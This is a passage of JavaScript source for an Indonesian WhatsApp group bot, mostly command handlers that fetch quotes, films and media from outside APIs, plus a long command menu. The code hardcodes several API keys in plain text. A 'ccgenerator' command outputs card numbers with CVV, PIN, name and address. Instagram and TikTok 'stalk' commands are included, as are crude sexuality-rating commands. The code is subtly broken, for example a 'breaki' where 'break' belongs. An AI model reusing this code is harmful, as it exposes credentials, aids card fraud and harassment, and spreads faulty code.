					anu = await fetchJson(`https://api.zeks.xyz/api/jadwaltv?channel=${gatauda}&apikey=apivinz`, {method: 'get'})
					reply(anu.result)
					await limitAdd(sender)
					break
		case 'kataAnggan': 
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					anu = await fetchJson(`https://api.shizukaa.xyz/api/bacotanAnggan?apikey=itsmeiky633`, {method: 'get'})
					reply(anu.result)
					await limitAdd(sender)
					break
		case 'katabucin': 
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					anu = await fetchJson(`https://api.shizukaa.xyz/api/bucin?apikey=itsmeiky633`, {method: 'get'})
					reply(anu.result)
					await limitAdd(sender)
					break
		case 'katabucin2': 
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					anu = await fetchJson(`https://api.shizukaa.xyz/api/bucin?apikey=itsmeiky633`, {method: 'get'})
					reply(anu.result)
					await limitAdd(sender)
					break
					case 'wame':
        if (isBanned) return reply('```Lu kebanned kontol```')
       if (!isRegistered) return reply(ind.noregis())
          Angga.updatePresence(from, Presence.composing)
          options = {
             text: `BY ANGGA : *wa.me/${sender.split("@s.whatsapp.net")[0]}*\n*Or ( / )*\n*api.whatsapp.com/send?phone=${sender.split("@")[0]}*`,
              contextInfo: {
              mentionedJid: [sender]
                }
                  }
            Angga.sendMessage(from, options, text, {quoted: mek})
           breaki
		case 'cerpen': 
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					anu = await fetchJson(`http://lolhuman.herokuapp.com/api/cerpen?apikey=${LoLKey}`, {method: 'get'})
					reply(anu.result.cerpen)
					await limitAdd(sender)
					break
		case 'quotes': 
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					anu = await fetchJson(`http://lolhuman.herokuapp.com/api/random/quotes?apikey=${LoLKey}`, {method: 'get'})
					reply(anu.result.quote)
					await limitAdd(sender)
					break
		case 'bacotanhacker': 
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					anu = await fetchJson(`https://api.shizukaa.xyz/api/bacotanhacker?apikey=itsmeiky633`, {method: 'get'})
					reply(anu.result)
					await limitAdd(sender)
					break
		case 'quotedoraemon': 
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					anu = await fetchJson(`https://api.shizukaa.xyz/api/quotedoraemon?apikey=itsmeiky633`, {method: 'get'})
					reply(anu.result.quote)
					await limitAdd(sender)
					break
		case 'resepmasakan':
					
                 if (!isRegistered) return reply( ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					anu = await fetchJson(`https://mnazria.herokuapp.com/api/resep?key=${body.slice(14)}`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					buffer = await getBuffer(anu.thumb_item)
					hasil = `*title* \n ${anu.title} *item_name* \n ${anu.item_name} *ingredient* \n${anu.ingredient} *step* \n${anu.step}`
					Angga.sendMessage(from, buffer, image, {quoted: mek, caption: hasil})
					await limitAdd(sender)
					break 
		case 'igstalk':
					if (!isRegistered) return reply(ind.noregis())
					get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/stalkig/${body.slice(9)}?apikey=KatoNiBoss`, {method: 'get'})
					get_result = get_result.result
					txt = `Link : https://www.instagram.com/${get_result.username}\n`
					txt += `Full : ${get_result.fullname}\n`
					txt += `Post : ${get_result.posts}\n`
					txt += `Followers : ${get_result.followers}\n`
					txt += `Following : ${get_result.following}\n`
					txt += `Bio : ${get_result.bio}\n`
					buffer = await getBuffer(get_result.photo_profile)
					Angga.sendMessage(from, buffer, image, {quoted: mek, caption: txt})
					break
					case 'tkstalk':
			if (!isRegistered) return reply(ind.noregis())
			username = args[0]
					get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/stalktiktok/${username}?apikey=${LoLKey}`, {method: 'get'})
					get_result = get_result.result
					txt = `Link : ${get_result.username}\n`
					txt += `Bio : ${get_result.bio}\n`
					txt += `Followers : ${get_result.followers}\n`
					txt += `Following : ${get_result.followings}\n`
					txt += `Likes : ${get_result.likes}\n`
					txt += `Vidio : ${get_result.video}\n`
					buffer = await getBuffer(get_result.user_picture)
					Angga.sendMessage(from, buffer, image, {quoted: mek, caption: txt})
					break
		case 'infofilm': 
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isBanned) return reply('Maaf kamu sudah terbenned!')
					ige = body.slice(10)
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/film2?q=${ige}&apikey=${TobzKey}`)
					buffer7 = await getBuffer(anu.result.thumbnail)
					capt = `➸ Judul : ${anu.result.judul}\n*➸ Bahasa :* ${anu.result.bahasa}\n*➸ Negara :* ${anu.result.negara}\n*➸ Aktor :* ${anu.result.aktor}\n*➸ Boxoffice :* ${anu.result.boxoffice}\n*➸ Dirilis :* ${anu.result.dirilis}\n*➸ Durasi :* ${anu.result.durasi}\n*➸ Katagori :* ${anu.result.kategori}\n*➸ Metascore :* ${anu.result.metascore}\n*➸ Vote :* ${anu.result.voting_imdb}\n*➸ Negara :* ${anu.result.negara}\n*➸ Sinopsis :* ${anu.result.sinopsis}\n*➸ Penghargaan :* ${anu.result.penghargaan}`
					Angga.sendMessage(from, buffer7, image, {quoted: mek, caption: capt})
					await limitAdd(sender)
					break
		case 'infofilm2': 
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isBanned) return reply('Maaf kamu sudah terbenned!')
					ige = body.slice(10)
					anu = await fetchJson(`http://lolhuman.herokuapp.com/api/lk21?apikey=${LoLKey}&query=${ige}`)
					buffer7 = await getBuffer(anu.result.thumbnail)
					capt = `➸ Nama Film : ${anu.result.title}\n*➸ Link :* ${anu.result.link}\n*➸ Genre :* ${anu.result.genre}\n*➸ Views :* ${anu.result.views}\n*➸ Durasi :* ${anu.result.duration}\n*➸ Dirilis :* ${anu.result.tahun}\n*➸ Rating :* ${anu.result.rating}\n*➸ Description :* ${anu.result.desc}\n*➸ Aktor :* ${anu.result.actors}\n*➸ Location :* ${anu.result.location}\n*➸ Date Release :* ${anu.result.date_release}\n*➸ Language :* ${anu.result.language}\n*➸ Link Download :* ${anu.result.link_dl}`
					Angga.sendMessage(from, buffer7, image, {quoted: mek, caption: capt})
					await limitAdd(sender)
					break
		case 'heroml':  
					
					if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isBanned) return reply('Maaf kamu sudah terbenned!')
				reply(`[❕] Loading`)
				ige = body.slice(8)
				anu = await fetchJson(`http://api.hurtzcrafter.xyz/herodetail?hero=${ige}`) 
				buffer7 = await getBuffer(anu.result.image)
				teks = `Hasil\n*Hero Name*: ${anu.result.hero_name}\n*Quotes Hero*: ${anu.result.entrance_quotes}\n*Hero Feature*: ${anu.result.hero_feature}\n*Items*: ${anu.result.items}\n*Character*: ${anu.result.character.chara}\n*Movement Speed*: ${anu.result.attributes.movement_speed}\n*Physical Attack*: ${anu.result.attributes.physical_attack}\n*Magic Power*: ${anu.result.attributes.magic_power}\n*Attack Speed*: ${anu.result.attributes.attack_speed}\n*Physical Defense*: ${anu.result.attributes.physical_defense}\n*Basic Atk Crit Rate*: ${anu.result.attributes.basic_atk_crit_rate}\n*HP*: ${anu.result.attributes.hp}\n*Mana*: ${anu.result.attributes.mana}\n*ability_crit_rate*: ${anu.result.attributes.ability_crit_rate}\n*hp_regen*: ${anu.result.attributes.hp_regen}\n*mana_regen*: ${anu.result.attributes.mana_regen}\n*Price Hero BP*: ${anu.result.price.battle_point}\n*Price Hero DM*: ${anu.result.price.diamond}\n*Price Hero FRAG*: ${anu.result.price.hero_fragment}\n*Role*: ${anu.result.role}\n*Durability*: ${anu.result.skill.durability}\n*offense*: ${anu.result.skill.offense}\n*skill_effects*: ${anu.result.skill.skill_effects}\n*difficulty*: ${anu.result.skill.difficulty}\n*speciality*: ${anu.result.speciality}\n*laning_recommendation*: ${anu.result.laning_recommendation}\n*release_date*: ${anu.result.release_date}`
				Angga.sendMessage(from, buffer7, image, {quoted: mek, caption: teks})
				await limitAdd(sender)
				break
				case 'igvideo': 
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply('Urlnya mana sayang?')
				if (!isUrl(args[0]) && !args[0].includes('www.instagram.com')) return reply(mess.error.lv)
					 ige = body.slice(9)
                     anu = await fetchJson(`http://lolhuman.herokuapp.com/api/instagram?apikey=${LoLKey}&url=${args[0]}`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					buffer = await getBuffer(anu.result)
                    Angga.sendMessage(from, buffer, video, )
				    break
				case 'igpost': 
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply('Urlnya mana sayang?')
				if (!isUrl(args[0]) && !args[0].includes('www.instagram.com')) return reply(mess.error.lv)
					 ige = body.slice(8)
                     anu = await fetchJson(`http://lolhuman.herokuapp.com/api/instagram?apikey=${LoLKey}&url=${args[0]}`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					buffer = await getBuffer(anu.result)
                    Angga.sendMessage(from, buffer, image, )
				    break
				case 'igtv': 
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply('Urlnya mana sayang?')
				if (!isUrl(args[0]) && !args[0].includes('www.instagram.com')) return reply(mess.error.lv)
					 ige = body.slice(6)
                     anu = await fetchJson(`http://lolhuman.herokuapp.com/api/instagram?apikey=${LoLKey}&url=${args[0]}`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					buffer = await getBuffer(anu.result)
                    Angga.sendMessage(from, buffer, video, )
				    break
				case 'tiktoknowm': 
                 if (!isRegistered) return reply( ind.noregis())
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (args.length < 1) return reply('Urlnya mana sayang?')
				if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.error.lv)
					 ige = body.slice(12)
                     anu = await fetchJson(`http://lolhuman.herokuapp.com/api/tiktok?apikey=${LoLKey}&url=${args[0]}`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					buffer = await getBuffer(anu.result.link)
                    Angga.sendMessage(from, buffer, video, )
				    break
				 case 'ccgenerator': 
					if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
                   reply(`_[❕] Loading_`)
				   anu = await fetchJson(`https://videfikri.com/api/ccgenerator/`, {method:'get'})
				   teks = `*Hasil CCGenerator*\n*♻️NUMBER*: ${anu.result.card.number}\n*♻️TYPE*: ${anu.result.card.network}\n*♻️CVV*: ${anu.result.card.cvv}\n*♻️PIN*: ${anu.result.card.pin}\n*♻️MONEY*: ${anu.result.card.balance}\n*♻️EXPIRE-MONTH*: *Custom*\n*♻️EXPIRE-YEAR*: *Custume*\n*♻️COUTRY*: ${anu.result.customer.country}\n*♻️NAME*: ${anu.result.customer.name}\n*♻️ADDRESS*: ${anu.result.customer.address}`
				   Angga.sendMessage(from, teks, text, {quoted: mek})
				   await limitAdd(sender)
				   break
				 case 'ceritahorror': 
					if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
                   reply(`_[❕] Loading_`)
				   anu = await fetchJson(`https://naufalhoster.xyz/tools/story_horror?apikey=IgygEb-7vT4iB-h2zOyi`, {method:'get'})
				   teks = `*Hasil Cerita*\n*Nama Cerita*: ${anu.result.title}\n*Cerita*: ${anu.result.story}`
				   Angga.sendMessage(from, teks, text, {quoted: mek})
				   await limitAdd(sender)
				   break
					/*
                case 'kickall':
					if (!isOwner) return reply(ind.ownerb())
					members_id = []
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += '\n\n'
					for (let mem of groupMembers) {
						teks += `*😘* ${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					mentions(teks, members_id, true)
					Angga.groupRemove(from, members_id)
					break*/
		case 'setreply':
					if (!isOwner) return reply(ind.ownerb())
					Angga.updatePresence(from, Presence.composing) 
					if (args.length < 1) return
					cr = body.slice(10)
					reply(`reply berhasil di ubah menjadi : ${cr}`)
					await limitAdd(sender)
					break 
		case 'setreplyy':
				if (!isAdmin) return reply('*Only Admin bot*')
					Angga.updatePresence(from, Presence.composing) 
					if (args.length < 1) return
					cr = body.slice(10)
					reply(`reply berhasil di ubah menjadi : ${cr}`)
					await limitAdd(sender)
					break 
		case 'grouplist':
					
                 if (!isRegistered) return reply( ind.noregis())
					Angga.updatePresence(from, Presence.composing) 
					teks = `\`\`\`Ini adalah list group AnggaGanzz :\n\n\`\`\``
					no = 0
					for (let hehehe of groupId) {
						no += 1
						teks += `\`\`\`[${no.toString()}]\`\`\` @${hehehe.split('@')[0]}\n`
					}
					teks += `\n\`\`\`Total grup : ${groupId.length}\`\`\``
					Angga.sendMessage(from, teks.trim(), extendedText, {quoted: mek})
					break
					
		case 'mining':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pushname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					if (!isEventon) return reply(`Maaf ${pushname} event mining tidak di aktifkan oleh owner`)
					if (isOwner | isAdmin | isPremium) {
					const one = Math.ceil(Math.random() * 100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
					addLevelingXp(sender, one)
					await reply(`Kamu bagian dari prabayar, aku akan berikan sebanyak *${one}Xp* untuk anda`)
                 					     }else{
					const mining = Math.ceil(Math.random() * 1000000000000000000000000)
					addLevelingXp(sender, mining)
					await reply(`*Selamat* ${pushname} kamu mendapatkan *${mining}Xp*`)
					}
					await limitAdd(sender)
					break
		case 'bisakah':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					bisakah = body.slice(1)
					const bisa =['Bisa','Tidak Bisa','Coba Ulangi']
					const keh = bisa[Math.floor(Math.random() * bisa.length)]
					Angga.sendMessage(from, 'Pertanyaan : *'+bisakah+'*\n\nJawaban : '+ keh, text, { quoted: mek })
					await limitAdd(sender)
					break
		case 'kapankah':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					kapankah = body.slice(1)
					const kapan =['Besok','Lusa','1 Hari Lagi','2 Hari Lagi','3 Hari Lagi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','7 Bulan Lagi','8 Bulan Lagi','9 Bulan Lagi','10 Bulan Lagi','11 Bulan Lagi','1 Tahun lagi','2 Tahun lagi','3 Tahun lag0i','4 Tahun lagi','5 Tahun lagi','6 Tahun lagi','7 Tahun lagi','8 Tahun lagi','9 Tahun lagi','10 Tahun lagi']
					const koh = kapan[Math.floor(Math.random() * kapan.length)]
					Angga.sendMessage(from, 'Pertanyaan : *'+kapankah+'*\n\nJawaban : '+ koh, text, { quoted: mek })
					await limitAdd(sender)
					break
		case 'apakah':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					apakah = body.slice(1)
					const apa =['Iya','Tidak','Bisa Jadi','Coba Ulangi']
					const kah = apa[Math.floor(Math.random() * apa.length)]
					Angga.sendMessage(from, 'Pertanyaan : *'+apakah+'*\n\nJawaban : '+ kah, text, { quoted: mek })
					await limitAdd(sender)
					break
		case 'bagaimanakah':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					bagaimanakah = body.slice(1)
					const bagai =['Kita Kenal?','Nanya Terus deh','Tidak Tahu','Coba Ulangi','Cari Aja Sendiri','Kurang Tahu','Mana Saya Tahu, Saya kan ikan']
					const mana = bagai[Math.floor(Math.random() * bagai.length)]
					Angga.sendMessage(from, 'Pertanyaan : *'+bagaimanakah+'*\n\nJawaban : '+ mana, text, { quoted: mek })
					await limitAdd(sender)
					break
					case 'semoji': 
                    if (args.length == 0) return reply(`Example: ${prefix + command} 😭`)
                    emoji = args[0]
                    try {
                    emoji = encodeURI(emoji[0])
                    } catch {
                    emoji = encodeURI(emoji)
                    }
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/smoji/${emoji}?apikey=${l0lhuman}`)
                    Angga.sendMessage(from, ini_buffer, sticker, { quoted: nayy1})
                    break      
		case 'rate':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					rate = body.slice(1)
					const ra =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const te = ra[Math.floor(Math.random() * ra.length)]
					Angga.sendMessage(from, 'Pertanyaan : *'+rate+'*\n\nJawaban : '+ te+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
                case 'sangecek':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					sange = body.slice(1)
					const sang =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const nge = sang[Math.floor(Math.random() * sang.length)]
					Angga.sendMessage(from, 'Pertanyaan : *'+sange+'*\n\nJawaban : '+ nge+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
                case 'gaycek':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					gayy = body.slice(1)
					const gay =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const yag = gay[Math.floor(Math.random() * gay.length)]
					Angga.sendMessage(from, 'Pertanyaan : *'+gayy+'*\n\nJawaban : '+ yag+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
                case 'lesbicek':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					lesbii = body.slice(1)
					const lesbi =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const bi = lesbi[Math.floor(Math.random() * lesbi.length)]
					Angga.sendMessage(from, 'Pertanyaan : *'+lesbii+'*\n\nJawaban : '+ bi+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
                case 'gantengcek':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					ganteng = body.slice(1)
					const gan =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
					Angga.sendMessage(from, 'Pertanyaan : *'+ganteng+'*\n\nJawaban : '+ teng+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
		case 'cantikcek':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					cantik = body.slice(1)
					const can =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
					Angga.sendMessage(from, 'Pertanyaan : *'+cantik+'*\n\nJawaban : '+ tik+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
		case 'watak':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					watak = body.slice(1)
					const wa =['Penyayang','Pemurah','Pemarah','Pemaaf','Penurut','Baik','Baperan','Baik Hati','penyabar','UwU','top deh, pokoknya','Suka Membantu']
					const tak = wa[Math.floor(Math.random() * wa.length)]
					Angga.sendMessage(from, 'Pertanyaan : *'+watak+'*\n\nJawaban : '+ tak, text, { quoted: mek })
					await limitAdd(sender)
				        break
		case 'hobby':
					
                 if (!isRegistered) return reply( ind.noregis())
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					hobby = body.slice(1)
					const hob =['Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
					const by = hob[Math.floor(Math.random() * hob.length)]
					Angga.sendMessage(from, 'Pertanyaan : *'+hobby+'*\n\nJawaban : '+ by, text, { quoted: mek })
					await limitAdd(sender)
					break
		case 'speed5':
		case 'ping3':
					
                 if (!isRegistered) return reply( ind.noregis())
					await Angga.sendMessage(from, `Pong!!!!\nSpeed: ${processTime(time, moment())} _Second_`)
					break
         case 'help': 
		case 'menu':
                 if (!isRegistered) return reply( ind.noregis())
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					const reqXp  = 5000 * (Math.pow(2, getLevelingLevel(sender)) - 1)
					const uangku = checkATMuser(sender)
					num = `${sender.split("@")[0]}@s.whatsapp.net`
		    ow = "6285283427860@s.whatsapp.net" //Ganti Nomor Mu
		    cuy = "6285283427860@s.whatsapp.net" // Ganti nomor mu
                    menusu = `
Hai...Selamat ${tampilHari} 
kak ${pushname}
◪ INFO DEVELOPER
│
└❏ Tag Angga : @${ow.split('@')[0]}
 ❏ Tag Angga : @${cuy.split('@')[0]}
  ----------------------------------
◪ YOUR INFO
│
└ ❏ Prefix: 「  ${prefix}  」
    ❏ Nama: ${pushname}
    ❏ Duit: *Rp.${uangku}.-*
    ❏ Tag: @${num.split('@')[0]}
    ❏ Role: *${role}*
    ❏ Level: ${getLevelingLevel(sender)}
    ❏ Xp: ${getLevelingXp(sender)}/${reqXp} 
    
    
*╠══ 〘 INFO BOT 〙 ══*
*║*
*╠➥ BOT VERSI : 18.0.0*
*╠➥ GROUP BOT メ*
*╠➥ *https://chat.whatsapp.com/JIx5V9Eo129KgDHYkMfc59*
*╠➥ SUBメ*
*╠➥ https://youtube.com/channel/UCndftoBQ60goY_fGTMaXGnA*
*╠❒ Total Fitur : 400++*
*╠❒ Spedd : ${process.uptime()}*
*╠❒ Total Pengguna : ${_registered.length}*

*╚═════════════════❀*
❏ *INGFO*
│
└◪› *${prefix}info*
*╠◪* *${prefix}snk*
*╠◪* *${prefix}lpr*
*╠◪* *${prefix}request*
*╠◪* *${prefix}blocklist*
*╠◪* *${prefix}join*
*╠◪* *${prefix}ping*
*╠◪* *${prefix}buypremium*
*╠◪* *${prefix}hargaprem*
*╠◪* *${prefix}totaluser*
*╠◪* *${prefix}credits*
*╚═════════════════❀*
❏ *GROUP MENU*
│
└◪› ${prefix}welcome [1/0]
*╠◪* ${prefix}nsfw [1/0]         
*╠◪* ${prefix}antilink [1/0]
*╠◪* ${prefix}leveling [1/0]
*╠◪* ${prefix}nobadword [1/0]
*╠◪* ${prefix}simih [1/0] 
*╠◪* ${prefix}promote [@tag]
*╠◪* ${prefix}demote [@tag]
*╠◪* ${prefix}tagall
*╠◪* ${prefix}hidetag50
*╠◪* ${prefix}infogc
*╠◪* ${prefix}listadmin
*╠◪* ${prefix}wakillist
*╠◪* ${prefix}premiumlist
*╠◪* ${prefix}banlist
*╠◪* ${prefix}blocklist
*╠◪* ${prefix}linkgc
*╠◪* ${prefix}mining
*╠◪* ${prefix}hidetag
*╠◪* ${prefix}grouplist
*╠◪* ${prefix}add [62]
*╠◪* ${prefix}kick [@tag]
*╠◪* ${prefix}setname
*╠◪* ${prefix}setdesc
*╠◪* ${prefix}setpp
*╠◪* ${prefix}listadmin
*╠◪* ${prefix}linkgc
*╠◪* ${prefix}antidelete [1/0]
*╠◪* ${prefix}leave
*╠◪* ${prefix}mining
*╠◪* ${prefix}level
*╠◪* ${prefix}grup [buka/tutup)
*╠◪* ${prefix}afk
*╠◪* ${prefix}kicktime @tag
*╠◪* ${prefix}hacked
*╚═════════════════❀*
❏ *OWNER MENU*
│
└◪› ${prefix}bc
*╠◪* ${prefix}addbadword [OWNER]
*╠◪* ${prefix}delbadword[OWNER]
*╠◪* ${prefix}bcgc [OWNER]
*╠◪* ${prefix}kickall [OWNEF]
*╠◪* ${prefix}setreply [OWNER]
*╠◪* ${prefix}setprefix [OWNER]
*╠◪* ${prefix}clearall [OWNER]
*╠◪* ${prefix}block [OWNER]
*╠◪* ${prefix}unblock [OWNER]
*╠◪* ${prefix}leave [OWNER]
*╠◪* ${prefix}event [1/0] [OWNER]
*╠◪* ${prefix}clone [OWNER]
*╠◪* ${prefix}setppbot [OWNER]
*╠◪* ${prefix}buggc [OWNER]
*╠◪* ${prefix}addpremium [OWNER]
*╠◪* ${prefix}bikingc [OWNER]
*╠◪* ${prefix}joingc [OWNER]
*╠◪* ${prefix}readall
*╠◪* ${prefix}setfake1\`\`\`
*╠◪* ${prefix}unreadall
*╚═════════════════❀*
❏ *INFORMATION MENU*
│
└◪› ${prefix}covidindo
*╠◪* ${prefix}infonomor
*╠◪* ${prefix}infogempa
*╠◪* ${prefix}infocuaca
*╠◪* ${prefix}infofilm
*╠◪* ${prefix}jadwaltv
*╠◪* ${prefix}jadwalsholat
*╠◪* ${prefix}tribunews
*╠◪* ${prefix}liputan6
*╠◪* ${prefix}foxnews
*╠◪* ${prefix}apkpure
*╠◪* ${prefix}film1
*╠◪* ${prefix}film2
*╠◪* ${prefix}lirik
*╠◪* ${prefix}searchfilm
*╠◪* ${prefix}nickff
*╚═════════════════❀*
❏ *MAKER MENU*
│
└◪› ${prefix}sticker
*╠◪* ${prefix}ttp
*╠◪* ${prefix}attp
*╠◪* ${prefix}nulis
*╠◪* ${prefix}nulis2
*╠◪* ${prefix}tahta
*╠◪* ${prefix}darkneon
*╠◪* ${prefix}candlemug
*╠◪* ${prefix}lovemsg
*╠◪* ${prefix}mugflower
*╠◪* ${prefix}narutobanner
*╠◪* ${prefix}paperonglass
*╠◪* ${prefix}romancetext
*╠◪* ${prefix}shadowtext
*╠◪* ${prefix}coffeecup
*╠◪* ${prefix}coffeecup2
*╠◪* ${prefix}glowingneon
*╠◪* ${prefix}underwater
*╠◪* ${prefix}hpotter
*╠◪* ${prefix}woodblock
*╠◪* ${prefix}gplaybutton
*╠◪* ${prefix}splaybutton
*╠◪* ${prefix}barcode
*╠◪* ${prefix}qrencode
*╠◪* ${prefix}ttp
*╠◪* ${prefix}attp
*╠◪* ${prefix}jokerlogo
*╠◪* ${prefix}calendermaker
*╠◪* ${prefix}pornhub
*╠◪* ${prefix}googletext
*╠◪* ${prefix}glitchtext
*╠◪* ${prefix}crosslogo
*╠◪* ${prefix}naruto
*╠◪* ${prefix}flowertext
*╠◪* ${prefix}silktext
*╠◪* ${prefix}flametext
*╠◪* ${prefix}glowtext
*╠◪* ${prefix}skytext
*╠◪* ${prefix}cslogo
*╠◪* ${prefix}lithgtext
